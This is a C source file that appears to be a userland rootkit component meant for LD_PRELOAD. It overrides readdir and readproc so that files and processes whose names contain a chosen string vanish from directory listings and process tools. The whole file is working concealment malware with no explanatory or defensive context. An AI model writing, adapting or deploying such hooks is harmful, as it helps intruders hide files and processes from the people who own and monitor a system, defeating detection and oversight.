#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <proc/readproc.h>

#define FILENAME_TO_HIDE ("example")

#define FREEPROC(proc) do                                \
	               {                                 \
                           if ((proc) != NULL)           \
			   {                             \
			       freeproc(proc);           \
		               (proc) = NULL;            \
			   }                             \
		       }                                 \
                       while (0)

typedef struct dirent* (*readdir_pfn_t)(DIR*);
typedef proc_t* (*readproc_pfn_t)(PROCTAB*, proc_t*);

static
readdir_pfn_t
g_original_readdir = NULL;

static
readproc_pfn_t
g_original_readproc = NULL;

struct
dirent*
readdir(DIR* dirp)
{
    struct dirent* ret = NULL;

    // Validate original function exists
    if (g_original_readdir == NULL) {
        g_original_readdir = dlsym(RTLD_NEXT, "readdir");
        if (g_original_readdir == NULL)
	    return ret;
    }

    // Invoke and skip directory entries to hide
    while ((ret = g_original_readdir(dirp)) != NULL) {
         if (strstr(ret->d_name, FILENAME_TO_HIDE))
	    continue;
	return ret;
    }

    // readdir returns NULL when no entries left
    return ret;
}

/* will fix when have the time */
proc_t*
readproc(PROCTAB* PT, proc_t* return_buf)
{
    struct proc_t* ret = NULL;

    // Validate original function exists
    if (g_original_readproc == NULL) {
        g_original_readproc = dlsym(RTLD_NEXT, "readproc");
	if (!g_original_readproc)
            return ret;
    }

    // Invoke and skip process entries to hide
    do {
	// Free previously system-allocated buffers if required
        if (return_buf == NULL)
            FREEPROC(ret);
	
        ret = g_original_readproc(PT, return_buf);
        if (ret == NULL)
            return ret;
	
    } while ((ret->cmdline[0] != NULL) && (NULL != strstr(ret->cmdline[0], FILENAME_TO_HIDE)));

    // Return the entry
    return ret;
}
